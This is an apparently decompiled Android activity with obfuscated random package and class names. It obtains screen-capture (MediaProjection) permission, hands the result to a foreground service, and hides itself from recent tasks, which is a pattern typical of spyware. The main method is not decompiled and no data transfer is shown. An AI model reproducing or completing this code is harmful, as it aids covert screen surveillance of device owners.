package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
/* loaded from: classes.dex */
public class hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72_SCA extends Activity {

    /* renamed from: e */
    private static Intent f401e;

    /* renamed from: f */
    private static int f402f;

    /* renamed from: a */
    private MediaProjectionManager f403a;

    /* renamed from: b */
    private int f404b = 10;

    /* renamed from: c */
    private int f405c = 10;

    /* renamed from: d */
    private String f406d;

    @Override // android.app.Activity
    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        if (i == 59706 && i2 == -1) {
            try {
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f312h = Boolean.FALSE;
                f401e = intent;
                f402f = i2;
            } catch (Exception unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
            Intent putExtra = new Intent(this, crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.class).putExtra("resultCode", i2).putExtra("resultIntent", intent).putExtra("Q", this.f404b).putExtra("P", this.f406d).putExtra("F", this.f405c);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(putExtra);
            } else {
                startService(putExtra);
            }
        }
        finish();
    }

    /* JADX WARN: Removed duplicated region for block: B:42:0x00a0  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00aa A[Catch: Exception -> 0x01c0, TRY_LEAVE, TryCatch #0 {Exception -> 0x01c0, blocks: (B:25:0x006d, B:43:0x00a2, B:45:0x00aa, B:48:0x00ba, B:50:0x00ee, B:74:0x01a3, B:73:0x0173, B:75:0x01a7, B:77:0x01b8, B:78:0x01bc, B:28:0x0078, B:29:0x007a, B:31:0x0080, B:32:0x0083, B:34:0x0089, B:35:0x008c, B:37:0x0092, B:38:0x0095, B:40:0x009b, B:26:0x0071, B:52:0x00f5, B:68:0x0138, B:70:0x016b, B:71:0x016f, B:55:0x0112, B:56:0x0114, B:58:0x011a, B:59:0x011d, B:61:0x0123, B:62:0x0126, B:64:0x012c, B:65:0x012f, B:67:0x0135), top: B:82:0x006d, inners: #2, #5 }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x01a7 A[Catch: Exception -> 0x01c0, TryCatch #0 {Exception -> 0x01c0, blocks: (B:25:0x006d, B:43:0x00a2, B:45:0x00aa, B:48:0x00ba, B:50:0x00ee, B:74:0x01a3, B:73:0x0173, B:75:0x01a7, B:77:0x01b8, B:78:0x01bc, B:28:0x0078, B:29:0x007a, B:31:0x0080, B:32:0x0083, B:34:0x0089, B:35:0x008c, B:37:0x0092, B:38:0x0095, B:40:0x009b, B:26:0x0071, B:52:0x00f5, B:68:0x0138, B:70:0x016b, B:71:0x016f, B:55:0x0112, B:56:0x0114, B:58:0x011a, B:59:0x011d, B:61:0x0123, B:62:0x0126, B:64:0x012c, B:65:0x012f, B:67:0x0135), top: B:82:0x006d, inners: #2, #5 }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:10:0x003f -> B:82:0x006d). Please submit an issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:23:0x0068 -> B:82:0x006d). Please submit an issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:8:0x0037 -> B:82:0x006d). Please submit an issue!!! */
    @Override // android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    protected void onCreate(android.os.Bundle r13) {
        /*
            Method dump skipped, instructions count: 452
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72_SCA.onCreate(android.os.Bundle):void");
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
    }
}
